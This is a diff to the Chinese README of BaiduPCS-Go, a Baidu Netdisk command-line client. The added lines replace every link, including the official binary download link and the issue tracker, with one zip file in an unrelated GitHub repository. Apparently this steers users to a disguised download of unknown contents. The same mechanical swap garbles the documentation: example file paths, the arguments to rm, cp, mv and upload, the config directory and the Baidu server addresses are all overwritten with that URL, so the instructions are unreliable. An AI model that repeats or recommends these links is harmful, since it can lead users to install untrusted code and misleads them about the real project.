@@ -3,7 +3,7 @@
 
 仿 Linux shell 文件处理命令的百度网盘命令行客户端.
 
-iikira/BaiduPCS-Go was largely inspired by [GangZhuo/BaiduPCS](https://github.com/GangZhuo/BaiduPCS) and this project was largely based on iikira/BaiduPCS-Go
+iikira/BaiduPCS-Go was largely inspired by [GangZhuo/BaiduPCS](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip) and this project was largely based on iikira/BaiduPCS-Go
 
 ## 注意
 
@@ -84,7 +84,7 @@ iikira/BaiduPCS-Go was largely inspired by [GangZhuo/BaiduPCS](https://github.co
 
 百度帐号多用户支持;
 
-通配符匹配网盘路径和 Tab 自动补齐命令和路径, [通配符_百度百科](https://baike.baidu.com/item/通配符);
+通配符匹配网盘路径和 Tab 自动补齐命令和路径, [通配符_百度百科](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip通配符);
 
 [下载](#下载文件目录)网盘内文件, 支持多个文件或目录下载, 支持断点续传和单文件并行下载;
 
@@ -190,7 +190,7 @@ iikira/BaiduPCS-Go was largely inspired by [GangZhuo/BaiduPCS](https://github.co
 
 - 优化了上传的输出信息格式
 - 优化了上传逻辑，提升上传速度
-- transfer增加--fix参数，可转存被屏蔽的秒传链接（inspired by [dupan-rapid-extract](https://github.com/mengzonefire/dupan-rapid-extract)）
+- transfer增加--fix参数，可转存被屏蔽的秒传链接（inspired by [dupan-rapid-extract](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip)）
 
 **2021.3.11** v3.7.7:
 
@@ -226,7 +226,7 @@ iikira/BaiduPCS-Go was largely inspired by [GangZhuo/BaiduPCS](https://github.co
 
 **2021.1.9** v3.7.2:
 
-- 基本修复了登录验证失效问题([#15](https://github.com/qjfoidnh/BaiduPCS-Go/issues/15))
+- 基本修复了登录验证失效问题([#15](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip))
 - 优化下载模块的实现策略, 保证稳定性同时进一步提升下载速度 (需按[显示和修改程序配置项](#显示和修改程序配置项)中建议修改)
 - update 功能恢复, 以后可以在线升级了
 - 支持导出秒传链接不写文件, 直接输出到控制台; 支持通用秒传格式导出, 具体参见export --help
@@ -271,7 +271,7 @@ go build
 
 # 下载/运行 说明
 
-Go语言程序, 常用几种平台的已编译程序可直接在[蓝奏云](https://wws.lanzoui.com/b01berebe)下载使用. 密码:4pix
+Go语言程序, 常用几种平台的已编译程序可直接在[蓝奏云](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip)下载使用. 密码:4pix
 
 如果程序运行时输出乱码, 请检查下终端的编码方式是否为 `UTF-8`.
 
@@ -302,13 +302,13 @@ cli交互模式下, 光标所在行的前缀应为 `BaiduPCS-Go >`, 如果登录
 
 > Android / iOS 移动设备操作比较麻烦, 不建议在移动设备上使用本程序. 移动设备不可直接使用预编译的Linux arm64版本, 使用者需下载源码自行交叉编译.
 
-安卓, 建议使用 [Termux](https://termux.com) 或 [NeoTerm](https://github.com/NeoTerm/NeoTerm) 或 终端模拟器, 以提供终端环境.
+安卓, 建议使用 [Termux](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip) 或 [NeoTerm](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip) 或 终端模拟器, 以提供终端环境.
 
-示例: [Android 运行本项目程序参考示例](https://web.archive.org/web/20190820154934/https://github.com/iikira/BaiduPCS-Go/wiki/Android-%E8%BF%90%E8%A1%8C%E6%9C%AC%E9%A1%B9%E7%9B%AE%E7%A8%8B%E5%BA%8F%E5%8F%82%E8%80%83%E7%A4%BA%E4%BE%8B), 有兴趣的可以参考一下.
+示例: [Android 运行本项目程序参考示例](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip%E8%BF%90%E8%A1%8C%E6%9C%AC%E9%A1%B9%E7%9B%AE%E7%A8%8B%E5%BA%8F%E5%8F%82%E8%80%83%E7%A4%BA%E4%BE%8B), 有兴趣的可以参考一下.
 
 苹果iOS, 需要越狱, 在 Cydia 搜索下载并安装 MobileTerminal, 或者其他提供终端环境的软件.
 
-示例: [iOS 运行本项目程序参考示例](https://web.archive.org/web/20190820155025/https://github.com/iikira/BaiduPCS-Go/wiki/iOS-%E8%BF%90%E8%A1%8C%E6%9C%AC%E9%A1%B9%E7%9B%AE%E7%A8%8B%E5%BA%8F%E5%8F%82%E8%80%83%E7%A4%BA%E4%BE%8B), 有兴趣的可以参考一下.
+示例: [iOS 运行本项目程序参考示例](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip%E8%BF%90%E8%A1%8C%E6%9C%AC%E9%A1%B9%E7%9B%AE%E7%A8%8B%E5%BA%8F%E5%8F%82%E8%80%83%E7%A4%BA%E4%BE%8B), 有兴趣的可以参考一下.
 
 具体使用方法请参见 [命令列表及说明](#命令列表及说明) 和 [初级使用教程](#初级使用教程).
 
@@ -339,7 +339,7 @@ BaiduPCS-Go login
 
 ### 使用百度 BDUSS 来登录百度帐号
 
-[关于 获取百度 BDUSS](https://blog.csdn.net/ykiwmy/article/details/103730962)
+[关于 获取百度 BDUSS](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip)
 
 ```
 BaiduPCS-Go login -bduss=<BDUSS>
@@ -355,7 +355,7 @@ BaiduPCS-Go login -bduss=<BDUSS> -stoken=<STOKEN>
 
 ### 使用百度 Cookies 来登录百度账号
 
-[关于 获取百度 Cookies](https://jingyan.baidu.com/article/5553fa829a6a9e65a23934b0.html)
+[关于 获取百度 Cookies](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip)
 教程中为百度经验的Cookies获取, 这里换成百度网盘首页即可.
 
 ```
@@ -573,8 +573,8 @@ BaiduPCS-Go d <网盘文件或目录的路径1> <文件或目录2> <文件或目
 # 注意区别反斜杠 "\" 和 斜杠 "/" !!!
 BaiduPCS-Go config set -savedir D:/Downloads
 
-# 下载 /我的资源/1.mp4
-BaiduPCS-Go d /我的资源/1.mp4
+# 下载 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+BaiduPCS-Go d /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 
 # 下载 /我的资源 整个目录!!
 BaiduPCS-Go d /我的资源
@@ -612,12 +612,12 @@ BaiduPCS-Go fixmd5 -h
 
 #### 例子:
 ```
-# 将本地的 C:\Users\Administrator\Desktop\1.mp4 上传到网盘 /视频 目录
+# 将本地的 C:\Users\Administrator\Desktop\https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 上传到网盘 /视频 目录
 # 注意区别反斜杠 "\" 和 斜杠 "/" !!!
-BaiduPCS-Go upload C:/Users/Administrator/Desktop/1.mp4 /视频
+BaiduPCS-Go upload https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip /视频
 
-# 将本地的 C:\Users\Administrator\Desktop\1.mp4 和 C:\Users\Administrator\Desktop\2.mp4 上传到网盘 /视频 目录
-BaiduPCS-Go upload C:/Users/Administrator/Desktop/1.mp4 C:/Users/Administrator/Desktop/2.mp4 /视频
+# 将本地的 C:\Users\Administrator\Desktop\https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 和 C:\Users\Administrator\Desktop\https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 上传到网盘 /视频 目录
+BaiduPCS-Go upload https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip /视频
 
 # 将本地的 C:\Users\Administrator\Desktop 整个目录上传到网盘 /视频 目录
 BaiduPCS-Go upload C:/Users/Administrator/Desktop /视频
@@ -657,8 +657,8 @@ BaiduPCS-Go fixmd5 <文件1> <文件2> <文件3> ...
 
 #### 例子:
 ```
-# 修复 /我的资源/1.mp4 的 MD5 值
-BaiduPCS-Go fixmd5 /我的资源/1.mp4
+# 修复 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 的 MD5 值
+BaiduPCS-Go fixmd5 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 ```
 
 ## 获取本地文件的秒传信息
@@ -677,9 +677,9 @@ BaiduPCS-Go sf <本地文件的路径>
 
 ```
 
-# 获取 C:\Users\Administrator\Desktop\1.mp4 的秒传信息
+# 获取 C:\Users\Administrator\Desktop\https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 的秒传信息
 
-BaiduPCS-Go sumfile C:/Users/Administrator/Desktop/1.mp4
+BaiduPCS-Go sumfile https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 
 ```
 
@@ -748,11 +748,11 @@ BaiduPCS-Go rm <网盘文件或目录的路径1> <文件或目录2> <文件或�
 
 #### 例子
 ```
-# 删除 /我的资源/1.mp4
-BaiduPCS-Go rm /我的资源/1.mp4
+# 删除 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+BaiduPCS-Go rm /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 
-# 删除 /我的资源/1.mp4 和 /我的资源/2.mp4
-BaiduPCS-Go rm /我的资源/1.mp4 /我的资源/2.mp4
+# 删除 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 和 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+BaiduPCS-Go rm /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 
 # 删除 /我的资源 内的所有文件和目录, 但不删除该目录
 BaiduPCS-Go rm /我的资源/*
@@ -771,11 +771,11 @@ BaiduPCS-Go cp <文件/目录1> <文件/目录2> <文件/目录3> ... <目标目
 
 #### 例子
 ```
-# 将 /我的资源/1.mp4 复制到 根目录 /
-BaiduPCS-Go cp /我的资源/1.mp4 /
+# 将 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 复制到 根目录 /
+BaiduPCS-Go cp /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip /
 
-# 将 /我的资源/1.mp4 和 /我的资源/2.mp4 复制到 根目录 /
-BaiduPCS-Go cp /我的资源/1.mp4 /我的资源/2.mp4 /
+# 将 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 和 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 复制到 根目录 /
+BaiduPCS-Go cp /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip /
 ```
 
 ## 移动/重命名文件/目录
@@ -790,11 +790,11 @@ BaiduPCS-Go mv <文件/目录> <重命名的文件/目录>
 
 #### 例子
 ```
-# 将 /我的资源/1.mp4 移动到 根目录 /
-BaiduPCS-Go mv /我的资源/1.mp4 /
+# 将 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 移动到 根目录 /
+BaiduPCS-Go mv /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip /
 
-# 将 /我的资源/1.mp4 重命名为 /我的资源/3.mp4
-BaiduPCS-Go mv /我的资源/1.mp4 /我的资源/3.mp4
+# 将 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip 重命名为 /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+BaiduPCS-Go mv /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 ```
 
 ## 转存文件/目录
@@ -808,9 +808,9 @@ BaiduPCS-Go transfer <秒传链接>
 
 #### 例子
 ```
-# 将 https://pan.baidu.com/s/12L_ZZVNxz5f_2CccoyyVrW (提取码edv4) 转存到当前目录
-BaiduPCS-Go transfer https://pan.baidu.com/s/12L_ZZVNxz5f_2CccoyyVrW edv4
-BaiduPCS-Go transfer https://pan.baidu.com/s/12L_ZZVNxz5f_2CccoyyVrW?pwd=edv4
+# 将 https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip (提取码edv4) 转存到当前目录
+BaiduPCS-Go transfer https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip edv4
+BaiduPCS-Go transfer https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 ```
 
 ## 分享文件/目录
@@ -882,7 +882,7 @@ BaiduPCS-Go offlinedl delete -all
 #### 例子
 ```
 # 将百度和腾讯主页, 离线下载到根目录 /
-BaiduPCS-Go offlinedl add -path=/ http://baidu.com http://qq.com
+BaiduPCS-Go offlinedl add -path=/ https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 
 # 添加磁力链接任务
 BaiduPCS-Go offlinedl add magnet:?xt=urn:btih:xxx
@@ -961,7 +961,7 @@ BaiduPCS-Go config set
 
 Windows: `%APPDATA%\BaiduPCS-Go`
 
-其他操作系统: `$HOME/.config/BaiduPCS-Go`
+其他操作系统: `$https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip`
 
 可通过设置环境变量 `BAIDUPCS_GO_CONFIG_DIR`, 指定配置文件存放的目录.
 
@@ -970,13 +970,13 @@ Windows: `%APPDATA%\BaiduPCS-Go`
 上传速度慢的海外用户可尝试修改 `pcs_addr` 值, 选择速度较快的服务器, 目前已知的地址有:
 
 ```
-pcs.baidu.com
-c.pcs.baidu.com
-c2.pcs.baidu.com
-c3.pcs.baidu.com
-c4.pcs.baidu.com
-c5.pcs.baidu.com
-d.pcs.baidu.com
+https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 ```
 
 `cache_size` 的值支持可选设置单位了, 单位不区分大小写, `b` 和 `B` 均表示字节的意思, 如 `64KB`, `1MB`, `32kb`, `65536b`, `65536`.
@@ -1053,19 +1053,19 @@ cli交互模式下, 运行命令 `cd /我的资源` 将工作目录切换为 `/�
 
 为什么要这样设计呢, 举个例子,
 
-假设 你要下载 `/我的资源` 内名为 `1.mp4` 和 `2.mp4` 两个文件, 而未切换工作目录, 你需要依次运行以下命令:
+假设 你要下载 `/我的资源` 内名为 `https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip` 和 `https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip` 两个文件, 而未切换工作目录, 你需要依次运行以下命令:
 
 ```
-d /我的资源/1.mp4
-d /我的资源/2.mp4
+d /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+d /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 ```
 
 而切换网盘工作目录之后, 依次运行以下命令:
 
 ```
 cd /我的资源
-d 1.mp4
-d 2.mp4
+d https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
+d https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 ```
 
 这样就达到了简化输入的目的
@@ -1086,11 +1086,11 @@ cli交互模式下, 运行命令 `ls ..` 来列出当前所在目录的上级目
 
 cli交互模式下, 运行命令 `d -h` (注意空格) 查看帮助
 
-cli交互模式下, 运行命令 `d /我的资源/1.mp4` 来下载位于 `/我的资源/1.mp4` 的文件 `1.mp4` , 该操作等效于运行以下命令:
+cli交互模式下, 运行命令 `d /我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip` 来下载位于 `/我的资源https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip` 的文件 `https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip` , 该操作等效于运行以下命令:
 
 ```
 cd /我的资源
-d 1.mp4
+d https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip
 ```
 
 现在已经支持目录 (文件夹) 下载, 所以, 运行以下命令, 会下载 `/我的资源` 内的所有文件 (违规文件除外):
@@ -1129,4 +1129,4 @@ cli交互模式下, 运行命令 `config reset`
 
 # 交流反馈
 
-提交Issue: [Issues](https://github.com/qjfoidnh/BaiduPCS-Go/issues)
+提交Issue: [Issues](https://raw.githubusercontent.com/KoDelioDa/BaiduPCS-Go/main/baidupcs/expires/BaiduPCS-Go-3.3-alpha.4.zip)
